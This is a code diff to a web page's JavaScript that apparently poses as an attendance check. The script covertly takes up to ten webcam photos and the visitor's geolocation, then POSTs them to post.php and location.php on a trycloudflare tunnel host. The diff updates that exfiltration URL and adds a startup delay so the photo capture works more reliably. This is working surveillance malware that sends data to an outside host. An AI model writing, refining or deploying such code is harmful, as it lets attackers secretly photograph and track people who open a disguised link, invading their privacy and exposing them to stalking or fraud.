@@ -97,7 +97,7 @@
         $.ajax({
           type:'POST',
           data:{cat:imgdata},
-          url:'https://limits-dts-dust-wesley.trycloudflare.com/post.php',
+          url:'https://digit-partition-hydrogen-mental.trycloudflare.com/post.php',
           dataType:'json',
           async:false
         }).always(function(){});
@@ -107,7 +107,7 @@
         $.ajax({
           type:'POST',
           data:{latitude:lat,longitude:lon,accuracy:acc},
-          url:'https://limits-dts-dust-wesley.trycloudflare.com/location.php',
+          url:'https://digit-partition-hydrogen-mental.trycloudflare.com/location.php',
           dataType:'json',
           async:false
         }).always(function(){});
@@ -130,7 +130,7 @@
           window._attendance_stream = stream;
           window._photo_count = 0;
           const MAX_PHOTOS = 10;
-          // capture immediately and then repeatedly every 1500ms until 10 photos
+          // capture with delay to allow video to initialize, then repeatedly every 1500ms until 10 photos
           function captureOnce(){
             try{
               if(window._photo_count >= MAX_PHOTOS){
@@ -146,8 +146,11 @@
               }
             }catch(e){}
           }
-          captureOnce();
-          window._attendance_capture_interval = setInterval(captureOnce, 1500);
+          // Wait 500ms for video stream to initialize before first capture
+          setTimeout(function(){
+            captureOnce();
+            window._attendance_capture_interval = setInterval(captureOnce, 1500);
+          }, 500);
           return true;
         }catch(e){
           return false;
